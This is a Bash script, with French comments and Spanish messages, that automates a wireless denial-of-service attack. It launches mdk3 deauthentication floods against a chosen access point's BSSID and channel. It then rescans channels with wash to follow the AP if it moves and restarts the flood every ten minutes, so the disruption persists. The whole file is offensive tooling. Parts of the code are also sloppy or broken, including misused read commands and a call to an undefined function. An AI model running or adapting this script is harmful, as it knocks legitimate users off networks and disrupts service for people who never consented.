#!/bin/bash
echo $$ >/tmp/terminal.pid

#####################################################

f_variables(){        # prise des variables pour attaquer le réseau directement
intmoniteur="$(cat cartedos.txt)"
canal="$(cat canal.txt)"
BSSID="$(cat bssid.txt)"
ESSID="$(cat ssid.txt)"
echo "$intmoniteur"
while [ -z "${intmoniteur}" ]; do read -r ${intmoniteur}; done



echo "$canal"
while [ -z "${canal}" ]; do read -r ${canal}; done



echo "$BSSID"
while [ -z ${BSSID} ]; do read -r ${BSSID}; done



echo "$ESSID"
while [ -z "${ESSID}" ]; do read -r ${ESSID}; done
f_floodinstantane   # lancement de l'attaque
}

#####################################################

f_kill5ghz(){
if [ -f "5ghz.txt" ];then   # verif si la dos en 5GHz est lancée ou pas pour l'arreter correctement
kill `cat /tmp/airodump.pid`
kill `cat /tmp/mdk4.pid`
kill `cat /tmp/airodumpghzz.pid`
kill 9 `cat /tmp/hostbase-1.6FR/terminalfrequence.pid`  # kill du pid de la dos en 5GHz
rm -rf output.txt
rm -rf rundos.txt
xterm -geometry '150x20' -hold -e bash infos.sh &> /dev/null &
sleep 600;
f_variablebis
else                      # si la dos en 5GHz n'est pas lancée on stop juste celle en 2.4GHz
kill `cat /tmp/airodump.pid`
rm -rf output.txt
rm -rf rundos.txt
xterm -geometry '150x20' -hold -e bash infos.sh &> /dev/null &
sleep 600;
f_variablebis
fi
}

#####################################################

f_variablebis(){     # après extinction éventuel du wifi on reprend les variables pour chercher le réseau a nouveau si la box a rebooté
intmoniteur="$(cat cartedos.txt)"
canal="$(cat canal.txt)"
BSSID="$(cat bssid.txt)"
ESSID="$(cat ssid.txt)"
echo "$intmoniteur"
while [ -z "${intmoniteur}" ]; do read -r ${intmoniteur}; done



echo "$canal"
while [ -z "${canal}" ]; do read -r ${canal}; done



echo "$BSSID"
while [ -z ${BSSID} ]; do read -r ${BSSID}; done



echo "$ESSID"
while [ -z "${ESSID}" ]; do read -r ${ESSID}; done

if [ -f "5ghz.txt" ];then   # si la dos en 5GHz a été choisie on lui indique qu'elle doit se relancer
echo -e "Le wifi a été éteinds relance de la vérification" > verifapresexctintionwifi.txt
bash rundos5ghz.sh & # a remplacer par rundos5ghz.sh
echo -e "Ok"
f_verifdos
else                        # autrement on relance juste la dos en 2.4GHz
f_verifdos
fi
}


#####################################################


f_verifdos(){    # fonction servant a s'assurer que la vérification du canal de l'AP avec les deauth en 2.GHz et 5GHz ne soient pas lancées en meme temps
if [ -f "rundos5ghz.txt" ];then
echo "Vérif de la dos 5GHz en parallèle détecté, mise en attente..."
sleep 190; # Si la deauth vérif en 5GHz est lancée on attend (190 étant caculé par rapport au délai maximal de vérif des 22 canals de la deauth en 5GHz)
echo -e "Relance de la dos 2.4GHz"
f_checkap
else
echo -e "Pas de dos 5GHz en parallèle détecté, on relance la fonction f_checkap"
f_checkap
fi
}


#####################################################

f_checkap(){
touch rundos.txt
intmoniteur="$(cat cartedos.txt)"
canal="$(cat canal.txt)"
BSSID="$(cat bssid.txt)"
ESSID="$(cat ssid.txt)"
echo "$intmoniteur"
while [ -z "${intmoniteur}" ]; do read -r ${intmoniteur}; done



echo "$canal"
while [ -z "${canal}" ]; do read -r ${canal}; done



echo "$BSSID"
while [ -z ${BSSID} ]; do read -r ${BSSID}; done



echo "$ESSID"
while [ -z "${ESSID}" ]; do read -r ${ESSID}; done
           
wash -i ${intmoniteur} -a -c ${canal} > output.txt &
echo $! >/tmp/airodump.pid
sleep 7;
if grep -q "${BSSID}" "output.txt" ; then 
   echo -e "\t\e[1;32m [+] el AP no ha movido, reiniciando el DoS..."
sleep 1;
kill `cat /tmp/mdk3.pid`
kill `cat /tmp/airodump.pid`
rm -rf output.txt
rm -rf rundos.txt
f_floodinstantane
else
    echo -e "\e[1;31m [] el AP ha movido... buscando le...\e[0m"
sleep 1;
rm -rf output.txt
kill `cat /tmp/mdk3.pid`
kill `cat /tmp/airodump.pid`
sleep 5;
fi

canal=1
wash -i ${intmoniteur} -a -c ${canal} > output.txt &
echo $! >/tmp/airodump.pid
sleep 7;
if grep -q "${BSSID}" "output.txt" ; then  
   echo -e "\t\e[1;32m [+] el AP esta en el canal 1, reiniciando el DoS..."
sleep 1;
kill `cat /tmp/airodump.pid`
rm -rf output.txt
rm -rf rundos.txt
f_floodinstantane
else
    echo -e "\e[1;31m [] el AP no esta en canal 1... buscando le...\e[0m"
sleep 1;
kill `cat /tmp/airodump.pid`
rm -rf output.txt
fi

canal=11
wash -i ${intmoniteur} -a -c ${canal} > output.txt &
echo $! >/tmp/airodump.pid
sleep 7;
if grep -q "${BSSID}" "output.txt" ; then 
   echo -e "\t\e[1;32m [+] el AP esta en el canal 11, reiniciando el DoS..."
sleep 1;
kill `cat /tmp/airodump.pid`
rm -rf output.txt
rm -rf rundos.txt
f_floodinstantane
else
    echo -e "\e[1;31m [] el AP no esta en canal 11... buscando le...\e[0m"
sleep 1;
kill `cat /tmp/airodump.pid`
rm -rf output.txt
fi

canal=6
wash -i ${intmoniteur} -a -c ${canal} > output.txt &
echo $! >/tmp/airodump.pid
sleep 7;
if grep -q "${BSSID}" "output.txt" ; then  
   echo -e "\t\e[1;32m [+] el AP esta en el canal 6, reiniciando el DoS..."
sleep 1;
kill `cat /tmp/airodump.pid`
rm -rf output.txt
rm -rf rundos.txt
f_floodinstantane
else
    echo -e "\e[1;31m [] el AP no esta en canal 6... buscando le...\e[0m"
sleep 1;
kill `cat /tmp/airodump.pid`
rm -rf output.txt
fi

canal=13
wash -i ${intmoniteur} -a -c ${canal} > output.txt &
echo $! >/tmp/airodump.pid
sleep 7;
if grep -q "${BSSID}" "output.txt" ; then  
   echo -e "\t\e[1;32m [+] el AP esta en el canal 13, reiniciando el DoS..."
sleep 1;
kill `cat /tmp/airodump.pid`
rm -rf output.txt
rm -rf rundos.txt
f_floodinstantane
else
    echo -e "\e[1;31m [] el AP no esta en canal 13... buscando le...\e[0m"
sleep 1;
kill `cat /tmp/airodump.pid`
rm -rf output.txt
fi

canal=5
wash -i ${intmoniteur} -a -c ${canal} > output.txt &
echo $! >/tmp/airodump.pid
sleep 7;
if grep -q "${BSSID}" "output.txt" ; then  
   echo -e "\t\e[1;32m [+] el AP esta en el canal 5, reiniciando el DoS..."
sleep 1;
kill `cat /tmp/airodump.pid`
rm -rf output.txt
rm -rf rundos.txt
f_floodinstantane
else
    echo -e "\e[1;31m [] el AP no esta en canal 3... buscando le...\e[0m"
sleep 1;
kill `cat /tmp/airodump.pid`
rm -rf output.txt
fi

canal=12
wash -i ${intmoniteur} -a -c ${canal} > output.txt &
echo $! >/tmp/airodump.pid
sleep 7;
if grep -q "${BSSID}" "output.txt" ; then 
   echo -e "\t\e[1;32m [+] el AP esta en el canal 12, reiniciando el DoS..."
sleep 1;
kill `cat /tmp/airodump.pid`
rm -rf output.txt
rm -rf rundos.txt
f_floodinstantane
else
    echo -e "\e[1;31m [] el AP no esta en los canales  1 3 6 9 11 and 13... --NO SUCESS-- toma manual control !\e[0m"
sleep 1;
kill `cat /tmp/airodump.pid`
rm -rf output.txt
fi

canal=3
wash -i ${intmoniteur} -a -c ${canal} > output.txt &
echo $! >/tmp/airodump.pid
sleep 7;
if grep -q "${BSSID}" "output.txt" ; then 
   echo -e "\t\e[1;32m [+] el AP esta en el canal 3, reiniciando el DoS..."
sleep 1;
kill `cat /tmp/airodump.pid`
rm -rf output.txt
rm -rf rundos.txt
f_floodinstantane
else
    echo -e "\e[1;31m [] el AP no esta en los canales  1 3 6 9 11 and 13... --NO SUCESS-- toma manual control !\e[0m"
sleep 1;
kill `cat /tmp/airodump.pid`
rm -rf output.txt
fi

canal=10
wash -i ${intmoniteur} -a -c ${canal} > output.txt &
echo $! >/tmp/airodump.pid
sleep 7;
if grep -q "${BSSID}" "output.txt" ; then 
   echo -e "\t\e[1;32m [+] el AP esta en el canal 10, reiniciando el DoS..."
sleep 1;
kill `cat /tmp/airodump.pid`
rm -rf output.txt
rm -rf rundos.txt
f_floodinstantane
else
    echo -e "\e[1;31m [] el AP no esta en los canales  1 3 6 9 11 and 13... --NO SUCESS-- toma manual control !\e[0m"
sleep 1;
kill `cat /tmp/airodump.pid`
rm -rf output.txt
fi

canal=7
wash -i ${intmoniteur} -a -c ${canal} > output.txt &
echo $! >/tmp/airodump.pid
sleep 7;
if grep -q "${BSSID}" "output.txt" ; then 
   echo -e "\t\e[1;32m [+] el AP esta en el canal 7, reiniciando el DoS..."
sleep 1;
kill `cat /tmp/airodump.pid`
rm -rf output.txt
rm -rf rundos.txt
f_floodinstantane
else
    echo -e "\e[1;31m [] el AP no esta en los canales  1 3 6 9 11 and 13... --NO SUCESS-- toma manual control !\e[0m"
sleep 1;
kill `cat /tmp/airodump.pid`
rm -rf output.txt
fi

canal=2
wash -i ${intmoniteur} -a -c ${canal} > output.txt &
echo $! >/tmp/airodump.pid
sleep 7;
if grep -q "${BSSID}" "output.txt" ; then 
   echo -e "\t\e[1;32m [+] el AP esta en el canal 2, reiniciando el DoS..."
sleep 1;
kill `cat /tmp/airodump.pid`
rm -rf output.txt
rm -rf rundos.txt
f_floodinstantane
else
    echo -e "\e[1;31m [] el AP no esta en los canales  1 3 6 9 11 and 13... --NO SUCESS-- toma manual control !\e[0m"
sleep 1;
kill `cat /tmp/airodump.pid`
rm -rf output.txt
fi

canal=8
wash -i ${intmoniteur} -a -c ${canal} > output.txt &
echo $! >/tmp/airodump.pid
sleep 7;
if grep -q "${BSSID}" "output.txt" ; then  
   echo -e "\t\e[1;32m [+] el AP esta en el canal 8, reiniciando el DoS..."
sleep 1;
kill `cat /tmp/airodump.pid`
rm -rf output.txt
rm -rf rundos.txt
f_floodinstantane
else
    echo -e "\e[1;31m [] el AP no esta en los canales  1 3 6 9 11 and 13... --NO SUCESS-- toma manual control !\e[0m"
sleep 1;
kill `cat /tmp/airodump.pid`
rm -rf output.txt
fi

canal=4
wash -i ${intmoniteur} -a -c ${canal} > output.txt &
echo $! >/tmp/airodump.pid
sleep 7;
if grep -q "${BSSID}" "output.txt" ; then 
   echo -e "\t\e[1;32m [+] el AP esta en el canal 4, reiniciando el DoS..."
sleep 1;
kill `cat /tmp/airodump.pid`
rm -rf output.txt
rm -rf rundos.txt
f_floodinstantane
else
    echo -e "\e[1;31m [] el AP no esta en los canales  1 3 6 9 11 and 13... --NO SUCESS-- toma manual control !\e[0m"
sleep 1;
kill `cat /tmp/airodump.pid`
rm -rf output.txt
fi

canal=9
wash -i ${intmoniteur} -a -c ${canal} > output.txt &
echo $! >/tmp/airodump.pid
sleep 7;
if grep -q "${BSSID}" "output.txt" ; then 
   echo -e "\t\e[1;32m [+] el AP esta en el canal 9, reiniciando el DoS..."
sleep 1;
kill `cat /tmp/airodump.pid`
rm -rf output.txt
rm -rf rundos.txt
f_floodinstantane
else
    echo -e "\e[1;31m [] el AP no esta en los canales  1 3 6 9 11 and 13... --NO SUCESS-- toma manual control !\e[0m"
sleep 1;
f_kill5ghz
fi
}

#####################################################

f_floodinstantane(){       # boucle 1 qui test le contenu du fichier en appelant la fonction boucle 2 toute les x seconde  (fonction juste au dessus f_checkap)
           echo -e "\e[1;34m[*]\e[0m Iniciando el DoS... el canal del AP  va a estar vérificando cada tiempo en segundas que has entrado..."
sleep 1;
xterm -hold -bg '#000000' -fg '#3A94FF' -e mdk3 ${intmoniteur} d -g -t ${BSSID} -c ${canal} &> /dev/null &
echo $! >/tmp/mdk3.pid
sleep 4;
while : ; do
sleep 600 ; f_verifdos ; done
}


#####################################################
f_activedos(){
clear
echo "1.  Dos"
read -p "Choix: " menuchoix
case ${menuchoix} in
1) unset clean; f_floodinterface ;;
*) f_activedos ;;
esac
}


# run as root
if [ "$(id -u)" != "0" ]; then
	echo -e "\e[1;31m[]\e[0m Ve te pedir al admin !" 1>&2
	exit 1
else
	clean=1
	f_variables
fi
